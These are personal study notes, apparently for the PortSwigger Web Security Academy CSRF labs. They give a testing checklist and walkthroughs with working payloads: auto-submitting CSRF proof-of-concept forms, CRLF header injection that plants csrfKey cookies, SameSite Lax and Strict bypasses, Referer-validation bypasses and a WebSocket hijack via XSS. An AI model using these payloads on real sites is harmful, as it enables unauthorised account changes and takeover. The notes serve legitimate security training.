Basic CSRF:
Capture request to change email
Right click > engagement tools > generate CSRF POC

Checks:
- A relevant Action (Change users email)
- Cookie-based session handling: session
- No unpredicatable parameters (search url parameter allows user to set cookie)

Tests:
- Change the request method from POST to GET
- Remove CSRF token and see if app accepts request
- See if csrf token can be replaced with other valid one
- See if csrf token is tied to non-session:
```
change Session cookie -> logs you out
change csrf key -> invalid CSRF token
= not linked
Change the csrf token and key to the ones of the other account you have (optional, just to confirm) -> observer we can use them
Header Injection:
Set csrfkey GET /?search=test%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None

adjust CSRF payload,change script for including you csrf token, adn key in the header injection:
<img src="https://0a93006d03b753f881a0263f004c004e.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None" onerror="document.forms[0].submit()">


```
- See if token is duplicated in cookie (again header injection + csrf to set the cookie as the csrf token)
- If Refearer header is blocking:
	- try removing it including:`<meta name="referrer" content="no-referrer">`
	- try appending the valid referer as param (http://evil?trusted.com...):
		Include: `Referrer-Policy: unsafe-url` on the exploit server HEAD
		and add on history.pushState: `history.pushState("", "", "/?0a8b008a04164f71818339a700860008.web-security-academy.net")`
- Check SameSite restrictions
```
SameSite=Lax (Default):
-> Method overwrite
	-> ?email=putadon%40puta.com&_method=POSTbypass)
-> Cookie Refresh (OauthFlow refreshes cookie)
	-> CSRF POC +
    <script>
      window.open('https://0a60001d03b15848815a118a005f003e.web-security-academy.net/social-login');
      setTimeout(changeEmail, 5000);
      function changeEmail(){
            document.forms[0].submit();
      };
    </script>


SameSite=Strict in /login defined:
-> Redirection
	-> /post/comment/confirmation?postId=1/../../my-account/change-email?email=testosterona%40test.com&submit=1
	Change script in CSRF POC (urlencode &) 
	<script>
    document.location = "https://0af2006f049bd0da80cf8fb100a500ed.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned2%40web-security-academy.net%26submit=1";
</script>
```

- CWSH SameSite=Strict:
```
With XSS on a allowed subdomain (found in JS Access-Control-Allow-Origin: https://cms-0a7c0019032ef6f280b02152006100d7.web-security-academy.net):
<script>
document.location=https://cms-0a7c0019032ef6f280b02152006100d7.web-security-academy.net/login?username=URLENCODED-CWSH&password=anyting";
</script>

```



labs stuff ---------------------------------------------------------------
##### CSRF with method validation
Capture request to change email
Change Request method to GET
Right click > engagement tools > generate CSRF POC

##### CSRF with token being present validation
Do the same but delete CSRF token


#### CSRF where token is not tied to user session
The csrf is accepted as long as you provide a csrf token different from your account, as we have 2 accounts, we just use the other account's token to deliver the exploit

#### CSRF with token tied to non-session cookie
We got csrf token and csrfkey on the cookie
![[Pasted image 20231030110352.png]]
If we change both csrf token and key to the ones the other user we have got, we see that we can change the email, this means, the csrfkey is not tied to the cookie session, resulting in a succesfull CSRF through header injection

Now to exploit it, we need to find that header injection in the web

In the search functionality, we find that the search term is specifying a cookie with set cookie
![[Pasted image 20231030111808.png]]
![[Pasted image 20231030111816.png]]
So we can try setting our csrfkey with %0d%0a =```\n```
```
GET /?search=hat%0d%0aSet-Cookie:+csrfkey=dmFdSFxP8pg9qmSPAImzttb0uvTF0cQaG
```
![[Pasted image 20231030112338.png]]
Successfully changed the csrfkey, now we can create the CSRF POC
tokens of carlos:
```
csrftoken = mwLNx0eXZOoDjDVMX5ctYFSDFycVYysj
csrfkey = t7szbWLt4IOkC3ftCnatslM3Loe2Lghv
```
We generate the CSRF POC with csrf token and key from the other acc
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aab005a036dec45801dfd0b0038000e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pene&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="iigFzNlTW6q8KIu7QEcVmdaxjMKfQewe" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
But we need to do some changes, we need to change through the header injection the csrfkey also
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab100fb04fa2ec48196707700a800df.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="payload5&#64;payload&#46;com" />
      <input type="hidden" name="csrf" value="FKZN7u06j0EHKhBRAdwQ35hgdqnV8QRv" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0ab100fb04fa2ec48196707700a800df.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=4oBd8bbzkosP8SpjDgIa4RJeI0IQaZ7U%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>
```
It will try to load the image with the new cookie, then submit the contents of the POC, as the image is not valid
If we test it on a tab, we see that the POC works, changing the email succesfully
The victim uses chrome, so we need to deilver the exploit from chrome
![[Pasted image 20231030124045.png]]


##### SameSite Lax bypass via cookie refresh
```
If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately
Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login
Bypass the popup blocker
Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked.

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2000af047ae18382872975000e00e9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pitos&#64;pitos&#46;com" />
    </form>
		<p>Click Anywhere on the page</p>
    <script>
      window.onclick = () => {
				window.open('https://0a2000af047ae18382872975000e00e9.web-security-academy.net/social-login');
				setTimeout(changeEmail, 5000);
			}
			function changeEmail(){
				document.forms[0].submit()
			}
    </script>
  </body>
</html>
```


##### CSRF where Referer validation depends on header being present
Validation depends on referer being present:
![[Pasted image 20231218105700.png]]
```
Add meta to CSRF PoC
<meta name="referrer" content="no-referrer">
```

##### CSRF with broken Referer validation
```
Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net
The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 
Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
To override strip behaviour sed a header:
Referrer-Policy: unsafe-url

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url


<html>
  <body>
    <form action="https://0ae900f403a5771e8151bb9f006e00e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aaaaaaaaaaaaaaaaaa&#64;pito&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0ae900f403a5771e8151bb9f006e00e2.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>


```

